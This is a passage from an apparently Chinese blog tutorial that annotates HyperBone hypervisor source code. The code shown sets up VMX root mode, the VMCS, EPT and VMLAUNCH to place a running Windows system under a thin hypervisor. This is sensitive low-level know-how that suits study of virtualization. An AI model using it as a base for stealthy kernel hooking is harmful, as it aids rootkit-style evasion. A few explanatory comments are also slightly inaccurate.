rbp, rsp</span><br><span class="line">movaps  xmm0, xmmword ptr [rcx+1A0h]</span><br><span class="line">movaps  xmm1, xmmword ptr [rcx+1B0h]</span><br><span class="line">movaps  xmm2, xmmword ptr [rcx+1C0h]</span><br><span class="line">movaps  xmm3, xmmword ptr [rcx+1D0h]</span><br><span class="line">movaps  xmm4, xmmword ptr [rcx+1E0h]</span><br><span class="line">movaps  xmm5, xmmword ptr [rcx+1F0h]</span><br><span class="line">movaps  xmm6, xmmword ptr [rcx+200h]</span><br><span class="line">movaps  xmm7, xmmword ptr [rcx+210h]</span><br><span class="line">movaps  xmm8, xmmword ptr [rcx+220h]</span><br><span class="line">movaps  xmm9, xmmword ptr [rcx+230h]</span><br><span class="line">movaps  xmm10, xmmword ptr [rcx+240h]</span><br><span class="line">movaps  xmm11, xmmword ptr [rcx+250h]</span><br><span class="line">movaps  xmm12, xmmword ptr [rcx+260h]</span><br><span class="line">movaps  xmm13, xmmword ptr [rcx+270h]</span><br><span class="line">movaps  xmm14, xmmword ptr [rcx+280h]</span><br><span class="line">movaps  xmm15, xmmword ptr [rcx+290h]</span><br><span class="line">ldmxcsr dword ptr [rcx+34h]</span><br><span class="line"></span><br><span class="line">mov     ax, [rcx+42h]</span><br><span class="line">mov     [rsp+20h], ax</span><br><span class="line">mov     rax, [rcx+98h] ; RSP</span><br><span class="line">mov     [rsp+18h], rax</span><br><span class="line">mov     eax, [rcx+44h]</span><br><span class="line">mov     [rsp+10h], eax</span><br><span class="line">mov     ax, [rcx+38h]</span><br><span class="line">mov     [rsp+08h], ax</span><br><span class="line">mov     rax, [rcx+0F8h] ; RIP</span><br><span class="line">mov     [rsp+00h], rax ; set RIP as return address (for iretq instruction).</span><br><span class="line"></span><br><span class="line">mov     rax, [rcx+78h]</span><br><span class="line">mov     rdx, [rcx+88h]</span><br><span class="line">mov     r8, [rcx+0B8h]</span><br><span class="line">mov     r9, [rcx+0C0h]</span><br><span class="line">mov     r10, [rcx+0C8h]</span><br><span class="line">mov     r11, [rcx+0D0h]</span><br><span class="line">cli</span><br><span class="line">mov     rbx, [rcx+90h]</span><br><span class="line">mov     rsi, [rcx+0A8h]</span><br><span class="line">mov     rdi, [rcx+0B0h]</span><br><span class="line">mov     rbp, [rcx+0A0h]</span><br><span class="line">mov     r12, [rcx+0D8h]</span><br><span class="line">mov     r13, [rcx+0E0h]</span><br><span class="line">mov     r14, [rcx+0E8h]</span><br><span class="line">mov     r15, [rcx+0F0h]</span><br><span class="line">mov     rcx, [rcx+80h]</span><br><span class="line">iretq</span><br><span class="line"></span><br><span class="line">VmRestoreContext ENDP</span><br></pre></td></tr></table></figure><h4 id="使用Intel虚拟化技术启动虚拟机，创建虚拟CPU"><a href="#使用Intel虚拟化技术启动虚拟机，创建虚拟CPU" class="headerlink" title="使用Intel虚拟化技术启动虚拟机，创建虚拟CPU"></a>使用Intel虚拟化技术启动虚拟机，创建虚拟CPU</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Execute VMLAUNCH</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;Vcpu&quot;&gt;Virtyal CPU data&lt;/param&gt;</span></span><br><span class="line"><span class="function">VOID <span class="title">VmxSubvertCPU</span><span class="params">( IN PVCPU Vcpu )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PHYSICAL_ADDRESS phys = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    phys.QuadPart = MAXULONG64;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化所有与VMX相关的MSR，通过读取它们的值来初始化</span></span><br><span class="line">    <span class="keyword">for</span> (ULONG i = <span class="number">0</span>; i &lt;= <span class="built_in">VMX_MSR</span>( MSR_IA32_VMX_VMCS_ENUM ); i++)</span><br><span class="line">        Vcpu-&gt;MsrData[i].QuadPart = __readmsr( MSR_IA32_VMX_BASIC + i );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据系统支持的功能，初始化次级控制（secondary controls）、真实模型专用寄存器（true MSRs）和VMFUNC</span></span><br><span class="line">    <span class="comment">// 见VmxCheckFeatures()</span></span><br><span class="line">    <span class="keyword">if</span> (g_Data-&gt;Features.SecondaryControls)</span><br><span class="line">        Vcpu-&gt;MsrData[<span class="built_in">VMX_MSR</span>( MSR_IA32_VMX_PROCBASED_CTLS2 )].QuadPart = __readmsr( MSR_IA32_VMX_PROCBASED_CTLS2 );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// True MSRs, if present</span></span><br><span class="line">    <span class="keyword">if</span> (g_Data-&gt;Features.TrueMSRs)</span><br><span class="line">        <span class="keyword">for</span> (ULONG i = <span class="built_in">VMX_MSR</span>( MSR_IA32_VMX_TRUE_PINBASED_CTLS ); i &lt;= <span class="built_in">VMX_MSR</span>( MSR_IA32_VMX_TRUE_ENTRY_CTLS ); i++)</span><br><span class="line">            Vcpu-&gt;MsrData[i].QuadPart = __readmsr( MSR_IA32_VMX_BASIC + i );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// VMFUNC, if present</span></span><br><span class="line">    <span class="keyword">if</span>(g_Data-&gt;Features.VMFUNC)</span><br><span class="line">        Vcpu-&gt;MsrData[<span class="built_in">VMX_MSR</span>( MSR_IA32_VMX_VMFUNC )].QuadPart = __readmsr( MSR_IA32_VMX_VMFUNC );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 分配VMXON、VMCS和VMM堆栈内存</span></span><br><span class="line">    Vcpu-&gt;VMXON    = <span class="built_in">MmAllocateContiguousMemory</span>( <span class="built_in">sizeof</span>( VMX_VMCS ), phys );</span><br><span class="line">    Vcpu-&gt;VMCS     = <span class="built_in">MmAllocateContiguousMemory</span>( <span class="built_in">sizeof</span>( VMX_VMCS ), phys );</span><br><span class="line">    Vcpu-&gt;VMMStack = <span class="built_in">MmAllocateContiguousMemory</span>( KERNEL_STACK_SIZE,  phys );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!Vcpu-&gt;VMXON || !Vcpu-&gt;VMCS || !Vcpu-&gt;VMMStack)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">DPRINT</span>( <span class="string">&quot;HyperBone: CPU %d: %s: Failed to allocate memory\n&quot;</span>, CPU_IDX, __FUNCTION__ );</span><br><span class="line">        <span class="keyword">goto</span> failed;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 进行保护设置</span></span><br><span class="line">    <span class="built_in">UtilProtectNonpagedMemory</span>( Vcpu-&gt;VMXON,    <span class="built_in">sizeof</span>( VMX_VMCS ), PAGE_READWRITE );</span><br><span class="line">    <span class="built_in">UtilProtectNonpagedMemory</span>( Vcpu-&gt;VMCS,     <span class="built_in">sizeof</span>( VMX_VMCS ), PAGE_READWRITE );</span><br><span class="line">    <span class="built_in">UtilProtectNonpagedMemory</span>( Vcpu-&gt;VMMStack, KERNEL_STACK_SIZE,  PAGE_READWRITE );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化内存空间</span></span><br><span class="line">    <span class="built_in">RtlZeroMemory</span>( Vcpu-&gt;VMXON,    <span class="built_in">sizeof</span>( VMX_VMCS ) );</span><br><span class="line">    <span class="built_in">RtlZeroMemory</span>( Vcpu-&gt;VMCS,     <span class="built_in">sizeof</span>( VMX_VMCS ) );</span><br><span class="line">    <span class="built_in">RtlZeroMemory</span>( Vcpu-&gt;VMMStack, KERNEL_STACK_SIZE );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 尝试进入VMX Root模式</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">VmxEnterRoot</span>( Vcpu ))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// I继续配置VMCS虚拟机控制结构（包括guest和host状态）</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        VMCS是是一种数据结构，用于存储虚拟机的状态信息，如处理器寄存器、段描述符、中断描述符等等。</span></span><br><span class="line"><span class="comment">        VMCS包含了虚拟机执行环境的所有状态信息，是虚拟机管理软件和硬件虚拟化扩展之间的接口。</span></span><br><span class="line"><span class="comment">        VMCS中有两种状态：guest状态和host状态。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        guest状态是指在虚拟机内执行的代码所使用的状态。</span></span><br><span class="line"><span class="comment">        当虚拟化软件将控制权转移到虚拟机内部时，处理器会使用VMCS中的guest状态信息来切换到虚拟机的执行环境。</span></span><br><span class="line"><span class="comment">        guest状态包含了虚拟机内部的所有状态信息，如处理器寄存器、页表、分段描述符等等。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        host状态是指在虚拟机外执行的代码所使用的状态。当虚拟机执行完成后，</span></span><br><span class="line"><span class="comment">        处理器需要恢复到虚拟化软件的执行环境中。</span></span><br><span class="line"><span class="comment">        VMCS中的host状态信息就提供了这个执行环境所需要的状态信息，如处理器寄存器、页表、分段描述符等等。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        在VMCS中，不同类型的状态信息被分为不同的区域，</span></span><br><span class="line"><span class="comment">        如控制区、guest状态区、host状态区等等。通过对VMCS的设置，虚拟化软件可以控制虚拟机的行为，</span></span><br><span class="line"><span class="comment">        如内存地址翻译、中断处理等等。</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="built_in">VmxSetupVMCS</span>( Vcpu );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 配置EPT</span></span><br><span class="line">        <span class="keyword">if</span>(g_Data-&gt;Features.EPT)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>( <span class="built_in">EptBuildIdentityMap</span>( &amp;Vcpu-&gt;EPT ) ))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">DPRINT</span>( <span class="string">&quot;HyperBone: CPU %d: %s: Failed to build EPT identity map\n&quot;</span>, CPU_IDX, __FUNCTION__ );</span><br><span class="line">                <span class="keyword">goto</span> failedvmxoff;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">EptEnable</span>( Vcpu-&gt;EPT.PML4Ptr );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 记录VMX已开启</span></span><br><span class="line">        Vcpu-&gt;VmxState = VMX_STATE_TRANSITION;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 在VmxSetupVmcs函数中设置了各种VMCS字段（VMCS fields）,</span></span><br><span class="line">        <span class="comment">// 让处理器跳转到VmxInitializeCPU中调用VmxSetupVmcs的RtlCaptureContext函数的返回地址。</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        RtlCaptureContext是一个Windows操作系统提供的函数，用于获取当前线程的上下文信息，</span></span><br><span class="line"><span class="comment">        包括寄存器的值和程序计数器的值。</span></span><br><span class="line"><span class="comment">        通过将处理器的控制流转移到RtlCaptureContext的返回地址，</span></span><br><span class="line"><span class="comment">        可以在VmxInitializeCPU函数中恢复处理器的状态，继续执行后续的代码逻辑。</span></span><br><span class="line"><span class="comment">        这样做的目的可能是为了在VmxInitializeCPU函数中进行额外的处理或记录虚拟机的初始化状态。</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="comment">// 原子自增操作，意味着有一个虚拟CPU被创建或启动。该函数确保在多线程环境下，对变量进行原子操作，避免了竞争条件。</span></span><br><span class="line">        <span class="built_in">InterlockedIncrement</span>( &amp;g_Data-&gt;vcpus );</span><br><span class="line">        <span class="type">int</span> res = __vmx_vmlaunch();<span class="comment">// 启动虚拟机</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 原子自减操作，表示一个虚拟CPU的执行已经结束或销毁。</span></span><br><span class="line">        <span class="built_in">InterlockedDecrement</span>( &amp;g_Data-&gt;vcpus );</span><br><span class="line">        <span class="comment">/* 这两个函数有c++11新特性atomic，详见文档 */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        如果程序执行到了这里，那么可能存在两种情况：VMCS设置失败，或者启动操作没有按照计划进行。</span></span><br><span class="line"><span class="comment">        无论是哪种情况，由于VmxEnabled没有被设置为1，都代表失败的情况。</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        Vcpu-&gt;VmxState = VMX_STATE_OFF;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">DPRINT</span>( <span class="string">&quot;HyperBone: CPU %d: %s: __vmx_vmlaunch failed with result %d\n&quot;</span>, CPU_IDX, __FUNCTION__, res );</span><br><span class="line"></span><br><span class="line">failedvmxoff:</span><br><span class="line">        __vmx_off();<span class="comment">// 关闭VMX</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">failed:;<span class="comment">// 失败处理 释放内存</span></span><br><span class="line">    <span class="keyword">if</span> (Vcpu-&gt;VMXON)</span><br><span class="line">        <span class="built_in">MmFreeContiguousMemory</span>( Vcpu-&gt;VMXON );</span><br><span class="line">    <span class="keyword">if</span> (Vcpu-&gt;VMCS)</span><br><span class="line">        <span class="built_in">MmFreeContiguousMemory</span>( Vcpu-&gt;VMCS );</span><br><span class="line">    <span class="keyword">if</span> (Vcpu-&gt;VMMStack)</span><br><span class="line">        <span class="built_in">MmFreeContiguousMemory</span>( Vcpu-&gt;VMMStack );</span><br><span class="line"></span><br><span class="line">    Vcpu-&gt;VMXON    = <span class="literal">NULL</span>;</span><br><span class="line">    Vcpu-&gt;VMCS     = <span class="literal">NULL</span>;</span><br><span class="line">    Vcpu-&gt;VMMStack = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="设置保护"><a href="#设置保护" class="headerlink" title="设置保护"></a>设置保护</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Change protection of nonpaged system address</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;ptr&quot;&gt;Address&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;size&quot;&gt;Size of region&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;protection&quot;&gt;New protection flags&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;Status code&lt;/returns&gt;</span></span><br><span class="line">NTSTATUS <span class="title function_">UtilProtectNonpagedMemory</span><span class="params">( IN PVOID ptr, IN ULONG64 size, IN ULONG protection )</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    MDL是Windows内核中的数据结构，Memory Descriptor List（内存描述列表）。</span></span><br><span class="line"><span class="comment">    它用于描述一个或多个连续物理内存页的详细信息。</span></span><br><span class="line"><span class="comment">    在Windows操作系统中，内存管理模块使用MDL来跟踪和管理内存分配、映射和保护。</span></span><br><span class="line"><span class="comment">    MDL通常与虚拟内存映射、物理内存页面和驱动程序之间的交互密切相关。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    MDL的主要字段包括：</span></span><br><span class="line"><span class="comment">        StartVa：指向MDL所描述的内存区域的起始虚拟地址。</span></span><br><span class="line"><span class="comment">        ByteCount：描述MDL涵盖的内存区域的总字节数。</span></span><br><span class="line"><span class="comment">        MappedSystemVa：如果MDL中的内存区域被映射到了系统地址空间，则该字段表示映射后的虚拟地址；否则为NULL。</span></span><br><span class="line"><span class="comment">        Process：指向拥有该MDL的进程对象的指针。</span></span><br><span class="line"><span class="comment">        Flags：用于标识MDL的一些特性，如是否映射到系统地址空间、是否是锁定的等。</span></span><br><span class="line"><span class="comment">    驱动程序可以通过创建和操作MDL来管理内存。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    NTSTATUS status = STATUS_SUCCESS;</span><br><span class="line">    PMDL pMdl = IoAllocateMdl( ptr, (ULONG)size, FALSE, FALSE, <span class="literal">NULL</span> );<span class="comment">// 创建一个包含给定地址的MDL</span></span><br><span class="line">    <span class="keyword">if</span> (pMdl)</span><br><span class="line">    &#123;</span><br><span class="line">        MmBuildMdlForNonPagedPool( pMdl );<span class="comment">// 将这个MDL描述的物理内存区域与非分页池相关联</span></span><br><span class="line">        pMdl-&gt;MdlFlags |= MDL_MAPPED_TO_SYSTEM_VA;<span class="comment">// 该MDL描述的虚拟地址映射到了内核的虚拟地址空间中</span></span><br><span class="line">        status = MmProtectMdlSystemAddress( pMdl, protection );<span class="comment">// 在MDL中描述的物理内存区域的保护属性设置为给定的属性</span></span><br><span class="line">        IoFreeMdl( pMdl );<span class="comment">// 释放MDL</span></span><br><span class="line">        <span class="keyword">return</span> status;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> STATUS_UNSUCCESSFUL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="启动Vmx-Root模式"><a href="#启动Vmx-Root模式" class="headerlink" title="启动Vmx Root模式"></a>启动Vmx Root模式</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Switch CPU to root mode</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;Vcpu&quot;&gt;Virtual CPU data&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;TRUE on success&lt;/returns&gt;</span></span><br><span class="line"><span class="function">BOOLEAN <span class="title">VmxEnterRoot</span><span class="params">( IN PVCPU Vcpu )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 将CPU切换到root模式，虚拟机监视器VMM运行的特权级别最高的模式，用于管理和控制虚拟机的执行</span></span><br><span class="line">    PKSPECIAL_REGISTERS Registers = &amp;Vcpu-&gt;HostState.SpecialRegisters;<span class="comment">// 主机特殊寄存器</span></span><br><span class="line">    PIA32_VMX_BASIC_MSR pBasic = (PIA32_VMX_BASIC_MSR)&amp;Vcpu-&gt;MsrData[<span class="built_in">VMX_MSR</span>( MSR_IA32_VMX_BASIC )];<span class="comment">// VMX基本MSR</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查虚拟机控制结构VMCS是否能够适应单个页面</span></span><br><span class="line">    <span class="keyword">if</span> (pBasic-&gt;Fields.RegionSize &gt; PAGE_SIZE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">DPRINT</span>( <span class="string">&quot;HyperBone: CPU %d: %s: VMCS region doesn&#x27;t fit into one page\n&quot;</span>, CPU_IDX, __FUNCTION__ );</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查VMCS所需的内存类型是否为写回缓存类型</span></span><br><span class="line">    <span class="keyword">if</span> (pBasic-&gt;Fields.MemoryType != VMX_MEM_TYPE_WRITEBACK)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">DPRINT</span>( <span class="string">&quot;HyperBone: CPU %d: %s: Unsupported memory type\n&quot;</span>, CPU_IDX, __FUNCTION__ );</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查是否支持使用真实MSR获取虚拟化功能信息</span></span><br><span class="line">    <span class="keyword">if</span> (pBasic-&gt;Fields.VmxCapabilityHint == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">DPRINT</span>( <span class="string">&quot;HyperBone: CPU %d: %s: No true MSR support\n&quot;</span>, CPU_IDX, __FUNCTION__ );</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 保存VMXON、VMCS的修订号</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    在硬件层面，VMXON指令用于激活处理器的虚拟机扩展（Intel VT-x或AMD-V），这是一种硬件虚拟化技术，</span></span><br><span class="line"><span class="comment">    允许多个虚拟机同时运行，并将它们隔离开来。VMXON指令的执行会初始化虚拟机相关的数据结构，</span></span><br><span class="line"><span class="comment">    并将处理器的运行模式从非虚拟化模式切换到虚拟化模式。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    在虚拟化环境中，VMXON指令通常由虚拟机监视器（VMM）或Hypervisor在启动虚拟机时调用。</span></span><br><span class="line"><span class="comment">    它必须在特权级别最高的模式下执行，通常是在操作系统内核中。</span></span><br><span class="line"><span class="comment">    执行VMXON指令后，处理器将转入根模式，VMM可以通过VMCS（虚拟机控制结构）对虚拟机进行管理和控制。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    Vcpu-&gt;VMXON-&gt;RevisionId = pBasic-&gt;Fields.RevisionIdentifier;</span><br><span class="line">    Vcpu-&gt;VMCS-&gt;RevisionId  = pBasic-&gt;Fields.RevisionIdentifier;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据MSR_IA32_VMX_CR0_FIXED0和MSR_IA32_VMX_CR0_FIXED1的要求修正CR0寄存器</span></span><br><span class="line">    Registers-&gt;Cr0 &amp;= Vcpu-&gt;MsrData[<span class="built_in">VMX_MSR</span>( MSR_IA32_VMX_CR0_FIXED1 )].LowPart;</span><br><span class="line">    Registers-&gt;Cr0 |= Vcpu-&gt;MsrData[<span class="built_in">VMX_MSR</span>( MSR_IA32_VMX_CR0_FIXED0 )].LowPart;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据MSR_IA32_VMX_CR4_FIXED0和MSR_IA32_VMX_CR4_FIXED1的要求修正CR4寄存器</span></span><br><span class="line">    Registers-&gt;Cr4 &amp;= Vcpu-&gt;MsrData[<span class="built_in">VMX_MSR</span>( MSR_IA32_VMX_CR4_FIXED1 )].LowPart;</span><br><span class="line">    Registers-&gt;Cr4 |= Vcpu-&gt;MsrData[<span class="built_in">VMX_MSR</span>( MSR_IA32_VMX_CR4_FIXED0 )].LowPart;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 提交r0、r4寄存器的更新</span></span><br><span class="line">    __writecr0( Registers-&gt;Cr0 );</span><br><span class="line">    __writecr4( Registers-&gt;Cr4 );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 开启VMX root模式</span></span><br><span class="line">    PHYSICAL_ADDRESS phys = <span class="built_in">MmGetPhysicalAddress</span>( Vcpu-&gt;VMXON );</span><br><span class="line">    <span class="type">int</span> res = __vmx_on( (PULONG64)&amp;phys );</span><br><span class="line">    <span class="keyword">if</span> (res)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">DPRINT</span>( <span class="string">&quot;HyperBone: CPU %d: %s: __vmx_on failed with status %d\n&quot;</span>, CPU_IDX, __FUNCTION__, res );</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 清除VMCS, 修改状态为Inactive</span></span><br><span class="line">    phys = <span class="built_in">MmGetPhysicalAddress</span>( Vcpu-&gt;VMCS );</span><br><span class="line">    <span class="keyword">if</span> (__vmx_vmclear( (PULONG64)&amp;phys ))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">DPRINT</span>( <span class="string">&quot;HyperBone: CPU %d: %s: __vmx_vmclear failed\n&quot;</span>, CPU_IDX, __FUNCTION__ );</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 加载VMCS, 设置状态为Active</span></span><br><span class="line">    <span class="keyword">if</span> (__vmx_vmptrld( (PULONG64)&amp;phys ))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">DPRINT</span>( <span class="string">&quot;HyperBone: CPU %d: %s: __vmx_vmptrld failed\n&quot;</span>, CPU_IDX, __FUNCTION__ );</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span 